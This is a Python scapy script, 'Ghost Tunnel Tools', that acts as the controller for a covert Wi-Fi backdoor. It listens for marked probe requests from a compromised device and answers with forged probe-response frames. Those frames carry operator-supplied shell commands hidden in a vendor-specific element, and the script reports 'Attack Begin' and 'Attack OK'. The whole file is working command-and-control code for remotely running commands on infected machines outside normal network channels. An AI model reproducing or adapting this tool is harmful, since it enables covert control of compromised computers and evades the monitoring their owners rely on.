#!usr/bin/python
#coding=utf-8
import sys, getopt
from scapy.all import *
import binascii
import time

#need modify /usr/lib/python2.7/dist-packages/scapy  252,262

class Tools:
    netSSID = 'ghost'       #Network name
    @staticmethod
    def getPayloadFrame(cmd, ct_addr2, addr2):
        payload = Dot11Elt(ID=221, info=('\x63\x63\x63'+cmd))
        response_dot11 = Dot11(subtype=5, addr1=ct_addr2,addr2=addr2, addr3=addr2,SC=22222)
        return RadioTap()/response_dot11/Dot11ProbeResp()/payload/Dot11Elt(ID='SSID', info=Tools.netSSID)
    @staticmethod
    def getTimeHash():
        hash_time = str(hash(time.time()))[0:8]
        return hash_time
    @staticmethod
    def CMDEncode(cmd):
        cmd_bin = ""
        for i in cmd:
            cmd_bin += binascii.a2b_hex(hex(ord(i))[2:4])
        cmd_bin += '\0'
        return cmd_bin

class Action1:
    def __init__(self):
        self.ReceiveHash = None;
        self.SendHash = None;
        self.number = 0;
    def Handle(self,packet):
        dot = packet.getlayer(Dot11)
        if dot != None and dot.type == 0 and dot.subtype == 4:
            data = str(packet)
            index = data.find("ac1")
            if  index>= 0:
                print("Get Frame!(0-11): " + data[index:index+11])
                self.ReceiveHash = data[index+3:index+11]
                ct_addr2 = packet.addr2
                if(self.SendHash == None):
                    self.SendHash = Tools.getTimeHash()
                cmd_bin = Tools().CMDEncode(self.SendHash+SendCMD)
                if(self.SendHash != self.ReceiveHash ):
                    self.number += 1;
                    print("Round ["+str(self.number)+"]  : Context is {"+cmd_bin+"}   "),
                    response_frame = Tools.getPayloadFrame(cmd_bin, ct_addr2, '22:22:22:22:22:22')
                    sendp(response_frame, iface="wlan0", count=500)
                else:
                    self.SendHash = None;
                    self.number = 0;
                    print("=====Attack OK!!!======")
                    exit(1);


SendCMD = ""
opts, args = getopt.getopt(sys.argv[1:], "hc:")
for op, value in opts:
    if op == "-c":
        try:
            SendCMD += value
            for j in args:
                SendCMD = SendCMD+" "+j
            print(SendCMD)
            act1 = Action1()
            #print("You input command is :[" + SendCMD+"]")
            print("=====Attack Begin======")
            print("Sniff Monitor...")
            sniff(iface="wlan0", prn=act1.Handle)
        except:
            #print("Please try again later")
            pass
    elif op == "-h":
        print('''
        ----------------------------------
           Ghost Tunnel Tools Manual...
        ----------------------------------
        ''')
